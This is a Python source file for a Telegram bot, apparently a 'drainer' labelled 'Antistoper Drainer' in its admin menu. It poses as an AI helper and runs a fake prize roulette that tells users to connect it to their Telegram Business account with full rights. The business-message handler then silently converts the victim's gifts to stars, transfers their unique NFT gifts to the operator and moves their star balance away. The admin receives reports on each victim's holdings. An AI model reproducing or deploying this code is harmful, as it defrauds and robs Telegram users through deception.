from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify, request, abort
from scraper import get_gift_data # Добавить вверху файла
from datetime import datetime

# --- Получение конфигурации из переменных окружения ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_STR = os.getenv("ADMIN_ID")
# --- Новая переменная для URL сервера ---
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")

if not TOKEN:
    raise ValueError("Необходимо установить переменную окружения BOT_TOKEN")
if not ADMIN_ID_STR:
    raise ValueError("Необходимо установить переменную окружения ADMIN_ID")

try:
    ADMIN_ID = int(ADMIN_ID_STR)
except ValueError:
    raise ValueError("Переменная окружения ADMIN_ID должна быть числом")

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

app = Flask(__name__, static_folder=None) # Отключаем стандартную обработку static

# --- Новый эндпоинт для Webhook ---
@app.route('/webhook', methods=['POST'])
async def webhook_handler():
    update = types.Update.model_validate(request.json, context={"bot": bot})
    await dp.feed_update(bot, update)
    return '', 200

# --- Статические страницы ---
@app.route('/')
def index():
    return app.send_static_file('index.html')

# Добавим обработку для других статичных файлов (js, css, images)
@app.route('/<path:path>')
def send_static(path):
    return app.send_static_file(path)

# --- Управление данными пользователей ---
USER_DATA_FILE = "user_data.json"
MAX_ATTEMPTS = 2

def read_user_data():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def write_user_data(data):
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# --- Новые API эндпоинты для рулетки ---

@app.route('/api/get_user_status')
def get_user_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400
    
    all_data = read_user_data()
    user_info = all_data.get(user_id, {"attempts": 0, "gifts": []})
    
    return jsonify({
        "attempts_left": MAX_ATTEMPTS - user_info.get("attempts", 0),
        "gifts": user_info.get("gifts", [])
    })

@app.route('/api/user', methods=['POST'])
def handle_user_data():
    data = request.json
    if not data:
        return jsonify({"error": "Invalid data"}), 400
        
    user_id = data.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400

    # Добавим логику создания пользователя, если он не существует
    all_data = read_user_data()
    user_info = all_data.setdefault(str(user_id), {"attempts": 0, "gifts": []})
    write_user_data(all_data)

    return jsonify({"status": "ok", "message": f"User {user_id} acknowledged."})

@app.route('/api/spin', methods=['POST'])
def handle_spin():
    data = request.json
    if not data:
        return jsonify({"error": "Invalid data"}), 400

    user_id = str(data.get('user_id'))
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400

    all_data = read_user_data()
    user_info = all_data.setdefault(user_id, {"attempts": 0, "gifts": []})

    if user_info["attempts"] >= MAX_ATTEMPTS:
        return jsonify({"error": "No attempts left"}), 403

    user_info["attempts"] += 1

    # Логика определения приза (копируем из prizes.js, чтобы не было рассинхрона)
    prizes = [
        {"name": "Nail Bracelet", "starPrice": 100000, "img": "images/nail_bracelet.png"},
        {"name": "Bonded Ring", "starPrice": 37500, "img": "images/bonded_ring.png"},
        {"name": "Neko Helmet", "starPrice": 14000, "img": "images/neko_helmet.png"},
        {"name": "Пусто", "starPrice": 0, "img": ""}
    ]
    won_prize = random.choice(prizes)

    if won_prize["starPrice"] > 0:
        gift_data = {
            **won_prize,
            "date": datetime.now().strftime('%d.%m.%Y')
        }
        user_info["gifts"].append(gift_data)

    write_user_data(all_data)
    
    return jsonify({"won_prize": won_prize})

@app.route('/prizes')
def prizes():
    # Здесь можно получать актуальные данные из базы или Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000₽", "price": 1000},
        {"name": "Пусто", "price": 0},
        {"name": "MacBook", "price": 150000},
        {"name": "Чашка", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "Книга", "price": 1000}
    ])

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user or not message.from_user.id:
        return
    try:
        if not message.text:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
        else:
            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")

    except Exception as e:
        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    # Добавляем кнопку для запуска WebApp
    webapp_url = "https://my-roulette-app-pi.vercel.app/" # <-- ЗАМЕНИ НА СВОЙ URL
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )
    
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if not message.from_user or not message.from_user.id:
        return

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
            parse_mode="HTML",
            reply_markup=keyboard # Добавляем клавиатуру
        )
    else:
        await message.answer(
            f"Antistoper Drainer\n\n🔗 "
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
            "/convert - конвертировать подарки в звезды",
            reply_markup=keyboard # Добавляем клавиатуру
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n\n"
        "Имя бота: <code>@GiftWinsSender_BOT</code>\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "❗ Не удалось получить права бизнес-бота. Проверьте подключение.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{getattr(business_connection.user, 'username', '—')}\n"
            f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("Обработка подарков…")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "🎁 Нет подарков."
    except Exception as e:
        return "🎁 Нет подарков."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

from aiogram import types
from aiogram.filters import Command
from g4f.client import Client as G4FClient

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = getattr(message, 'business_connection_id', None)
    user_id = getattr(message.from_user, 'id', None)

    if user_id == OWNER_ID:
        return

    if not business_id:
        print("business_connection_id is None")
        return

    # === Конвертация неуникальных подарков ===
    try:
        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
            except Exception as e:
                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.transfer_gift(
                        business_connection_id=business_id,
                        owned_gift_id=owned_gift_id,
                        new_owner_chat_id=task_id
                    )
                    print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
            except Exception as e:
                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
        if getattr(stars, 'amount', 0) > 0:
            print(f"Успешно отправлено {stars.amount} звёзд")
            await bot.transfer_business_account_stars(
                business_connection_id=business_id,
                star_count=int(stars.amount)
            )
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")

async def get_gifts():
    # Примерная заглушка, замените на реальный API
    return [
        {'name': 'Плюшевый медведь', 'price': 100},
        {'name': 'Кубок', 'price': 200},
        {'name': 'Сердце', 'price': 50},
        {'name': 'Звезда', 'price': 300},
        {'name': 'Книга', 'price': 80},
        {'name': 'Котик', 'price': 150},
        {'name': 'Робот', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}⭐", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("Нет подарков для рулетки.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("Крутим рулетку...")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"🎉 Поздравляем! Вы выиграли: <b>{win_gift['name']}</b> за <b>{win_gift['price']}⭐</b>.\n\n"
        "Чтобы забрать подарок, подключите бота в раздел Чат-боты Telegram для бизнеса.",
        parse_mode="HTML"
    )

    webapp_url = "https://my-roulette-app-pi.vercel.app/"  # или локальный ngrok, если тестируешь

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )

    await message.answer("Жми кнопку и крути рулетку!", reply_markup=keyboard)

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        
        # Проверяем, нужно ли показать инструкцию
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
                "Как это сделать:\n\n"
                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
                "❗️Для корректной работы боту требуются права на управление подарками."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Логика обработки выигрыша (остается без изменений)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"🎉 Поздравляем! Ты выиграл: {prize.get('name', 'ничего')} ({prize.get('starPrice', 0)}⭐)"
        else:
            text = "В этот раз не повезло, но попробуй еще раз!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("Произошла ошибка при обработке данных.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("Пожалуйста, укажите URL подарка. Пример: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("Не удалось получить информацию о подарке.")
        return

    # Форматируем красивый ответ
    details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', 'Без названия')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>Медиафайл</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

# --- Новые API эндпоинты для админ-панели ---

@app.route('/api/admin/connections')
def get_admin_connections():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != ADMIN_ID:
        abort(403) # Доступ запрещен
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        return jsonify(connections)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/user_data')
def get_admin_user_data():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != ADMIN_ID:
        abort(403) # Доступ запрещен
    try:
        user_data = read_user_data()
        return jsonify(user_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin')
def admin_page():
    # Отдаем статичный файл admin.html
    return app.send_static_file('admin.html')

# --- Команды бота ---

@dp.message(Command("admin"))
async def admin_command(message: types.Message):
    # Добавляем проверку, что message.from_user не None
    if message.from_user and message.from_user.id == ADMIN_ID:
        # URL обновлен для ngrok
        admin_url = "https://3956-62-216-60-70.ngrok-free.app/admin" 
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔑 Открыть админ-панель", web_app=WebAppInfo(url=admin_url))]
            ]
        )
        await message.answer("Добро пожаловать в панель администратора.", reply_markup=keyboard)
    else:
        await message.answer("У вас нет прав для доступа к этой команде.")

async def on_startup(bot: Bot):
    """Выполняется при старте"""
    if WEBHOOK_URL:
        await bot.set_webhook(url=WEBHOOK_URL + "/webhook")
        logging.info(f"Webhook set to {WEBHOOK_URL}/webhook")
    else:
        logging.warning("RENDER_EXTERNAL_URL not set, webhook is not configured.")

async def on_shutdown(bot: Bot):
    """Выполняется при остановке"""
    await bot.delete_webhook()
    logging.info("Webhook deleted.")

if __name__ == "__main__":
    # Этот блок теперь используется только для локального тестирования
    # На сервере Render он не будет выполняться
    logging.basicConfig(level=logging.INFO)
    print("Bot is running locally...")
    dp.run_polling(bot)

# Добавляем регистрацию startup/shutdown хендлеров
dp.startup.register(on_startup)
dp.shutdown.register(on_shutdown)